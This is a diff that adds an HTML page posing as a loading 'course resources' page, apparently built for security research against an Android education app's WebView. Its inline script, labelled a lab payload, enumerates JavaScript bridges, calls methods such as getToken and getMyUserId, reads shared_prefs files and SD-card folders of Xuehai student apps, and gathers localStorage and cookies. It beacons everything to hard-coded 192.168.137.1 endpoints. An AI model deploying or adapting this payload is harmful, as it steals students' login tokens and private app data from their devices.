@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>课程资源</title>
+<script>
+// P200-LAB payload: 在 file:// 源里运行（目标 WebView 开了 setAllowFileAccessFromFileURLs(true)）
+// 目的: 读本地文件(shared_prefs/数据) 并回传；同时尝试调用桥。
+(function () {
+  var OUT = [];
+  var BEACONS = [
+    "http://192.168.137.1:8000/BRIDGELEAK?d=",
+    "http://192.168.137.1:8099/TOKENLEAK?d=",
+    "http://192.168.137.1:8080/LEAK?d="
+  ];
+
+  function send(tag, data) {
+    try {
+      var s = encodeURIComponent(JSON.stringify({ src: location.href, tag: tag, d: data }));
+      BEACONS.forEach(function (b) {
+        try { new Image().src = b + s; } catch (e) {}
+        try { fetch(b + s, { mode: "no-cors" }); } catch (e) {}
+      });
+      OUT.push([tag, data]);
+    } catch (e) {}
+  }
+
+  // 1) 探测可用的桥
+  var bridges = ["webView", "xuehai", "js", "LauncherJs", "jsBridge", "android", "powerPointUtil", "aiTeacher"];
+  var found = {};
+  bridges.forEach(function (b) {
+    try {
+      var o = window[b];
+      if (o) {
+        found[b] = [];
+        for (var k in o) {
+          try { if (typeof o[k] === "function") found[b].push(k); } catch (e) {}
+        }
+      }
+    } catch (e) {}
+  });
+  send("bridges", found);
+
+  // 2) 尝试桥的常见方法（拿令牌/信息）
+  function tryCall(b, m, args) {
+    try { if (window[b] && typeof window[b][m] === "function") { var r = window[b][m].apply(window[b], args || []); send("call:" + b + "." + m, String(r).slice(0, 400)); } } catch (e) { send("callerr:" + b + "." + m, String(e).slice(0, 200)); }
+  }
+  tryCall("webView", "getToken");
+  tryCall("webView", "getMyUserId");
+  tryCall("webView", "getClassInfo");
+  tryCall("webView", "getBaseUrl");
+  tryCall("xuehai", "getToken");
+
+  // 3) file:// 读文件（配合 allowFileAccessFromFileURLs）
+  var TARGETS = [
+    "file:///data/data/com.xh.smartclassstu/shared_prefs/",
+    "file:///data/data/com.xh.smartclassstu/shared_prefs/xh_sp.xml",
+    "file:///data/data/com.xh.smartclassstu/shared_prefs/config.xml",
+    "file:///data/data/com.xh.zhitongyunstu/shared_prefs/",
+    "file:///data/data/com.xuehai.launcher/shared_prefs/",
+    "file:///sdcard/xuehai/",
+    "file:///sdcard/xuehai/share/",
+    "file:///sdcard/Android/data/com.xh.smartclassstu/"
+  ];
+  TARGETS.forEach(function (t) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("GET", t, true);
+      x.onload = function () { send("file:" + t, x.responseText ? x.responseText.slice(0, 3000) : ("[" + x.status + " empty]")); };
+      x.onerror = function () { send("fileerr:" + t, "onerror"); };
+      x.send();
+    } catch (e) { send("fileexc:" + t, String(e)); }
+  });
+
+  // 4) localStorage / cookie
+  try { send("ls", Object.keys(localStorage).map(function (k) { return [k, String(localStorage.getItem(k)).slice(0, 300)]; })); } catch (e) {}
+  try { send("cookie", document.cookie); } catch (e) {}
+  try { send("ua", navigator.userAgent); } catch (e) {}
+})();
+</script>
+</head>
+<body>
+<div style="font-family:sans-serif;padding:12px">
+  <h3>课程资源加载中…</h3>
+</div>
+</body>
+</html>
